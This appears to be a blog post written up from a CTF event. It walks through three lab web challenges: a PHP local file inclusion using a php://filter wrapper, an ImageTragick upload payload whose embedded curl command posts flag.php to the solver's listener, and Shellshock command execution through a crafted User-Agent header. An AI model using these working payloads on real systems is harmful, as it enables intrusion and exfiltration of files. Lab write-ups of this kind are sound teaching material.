---
layout: post
title: "CTF7E4 - Web Challenges"
categories: CTF7E4
---
## 1. f1ltered
&nbsp;
**Challenge Description:**{: style="color: red"}
Read the source Luke!
- **Hosted on:** http://10.10.10.88:80

&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/filtered1.png){:.images}
&nbsp;

When we clicked on "Show News" button, paramter **page** changed from **?page=index** to **?page=news**. In this case we knew that it's including a local .php file and in this case we can try for LFI (Local File Inclusion).

&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/filtered2.png){:.images}
&nbsp;

When including **?page=flag**, we saw a message saying *"It's here, you just have to see it."*. If the php code is vulnerable to LFI, we can try to read the source code with php wrappers. There are many [php wrappers](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi--rfi-using-wrappers) which can be used for different attacks, such as executing code, reading zipped/compressed files, etc. Since the flag we need is inside **flag.php**, we can use **php://filter** to convert the source code to base64 and force the server to interpret it so we can later decode it.
&nbsp;

> **http://10.10.10.88/index.php?page=php://filter/convert.base64-encode/resource=flag**{: style="color: red"}
&nbsp;

![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/filtered3.png){:.images}
&nbsp;


> **echo "PD9waHAKCgkjWE9Se3BIcF93cjRwcGVyc188M30KCWVjaG8gIkl0J3MgaGVyZSB5b3UganVzdCBoYXZlIHRvIHNlZSBpdCI7Cgo/Pgo=" \| base64 -d**{: style="color: red"}


{% highlight php %}
<?php                     

	#XOR{pHp_wr4ppers_<3}
	echo "It's here you just have to see it";

?>
{% endhighlight %}
&nbsp;


## 2. Tr4g1ck
&nbsp;
**Challenge Description:**{: style="color: red"}
inurl:"hackerone" insite:"tragick"
- **Hosted on:** http://10.10.10.88:8000

&nbsp;
Browsing to http://10.10.10.88:8000, directory listing was enabled by default so we started analyzing the files that were present there.

&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/tragick1.png){:.images}
&nbsp;

We noticed that demo.php is converting or executing vul.jpg which can be uploaded by upload.php form. There was a [critical vulnerability](https://imagetragick.com) that was found on ImageMagick which is used by many websites for image processing.

&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/tragick2.png){:.images}
&nbsp;

There are many [PoCs](https://github.com/ImageTragick/PoCs) available on GitHub that explain how to get a reverse shell, but since our goal here is to only read the flag inside flag.php, we can use a simple curl command to send the flag back to our server.

&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/tragick3.png){:.images}
&nbsp;

We uploaded vul.jpg with the below content inside it.
&nbsp;

```
cat vul.jpg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg?`curl -d @flag.php http://10.10.20.2:9000/`"||id" )'
pop graphic-context
```

&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/tragick4.png){:.images}
&nbsp;

By default, python module 'http.server' does not accept POST requests, so in this case we used a [modified](https://gist.githubusercontent.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7/raw/a6a1d090ac8549dac8f2bd607bd64925de997d40/server.py) version of it. As soon as the file was uploaded, demo.php executed it and the content of flag.php came to our server listening on port 9000.

&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/tragick5.png){:.images}
&nbsp;


&nbsp;
&nbsp;
## 3. Old but Gold
&nbsp;
**Challenge Description:**{: style="color: red"}
Have  you seen Mr. Robot Season 1?
- **Hosted on:** http://10.10.10.88:7000

&nbsp;
Browsing to http://10.10.10.88:7000, we can only see a blank page but looking at the source code we notice something strange.

> curl https://10.10.10.88:7000                                                    **<\!-- Mr Robot - Ones and Zer0s -->**{: style="color: red"}

After spending a short time searching on google, we saw that in the episode 'Ones and Zer0s' E-Corp mail servers haven't been patched since "ShellShock" so Elliot uses this vulnerability to hack into Tyrell's email. Usually shellshock is located on cgi scripts so we can use different tools such as dirsearch, gobuster, ffuf to find these hidden files and directories. 
&nbsp;

&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/oldbutgold.png){:.images}
&nbsp;

> **→ ffuf -c -w ~/tools/SecLists/Discovery/Web-Content/common.txt -u http://10.10.10.88:7000/cgi-bin/FUZZ**
**stats  [Status: 200, Size: 107, Words: 17, Lines: 5]**{: style="color: red"}


> **→ curl -H "User-Agent: () { :; }; echo; /usr/bin/whoami" http://10.10.10.88:7000/cgi-bin/stats**                                                                    
**www-data**{: style="color: red"}

> **→ curl -H "User-Agent: () { :; }; echo; /bin/ls /var/www/" http://10.10.10.88:7000/cgi-bin/stats**                                                     
**16c5a217fbe1a2002019d4d5720e5724.txt**{: style="color: red"}
**index.html**{: style="color: red"}

> **→ curl -H "User-Agent: () { :; }; echo; /bin/cat /var/www/16c5a217fbe1a2002019d4d5720e5724.txt" http://10.10.10.88:7000/cgi-bin/stats**        
**XOR{sh3ll_sh0ck3d}**{: style="color: red"}

&nbsp;
I hope you had fun solving these challenges and learning something new.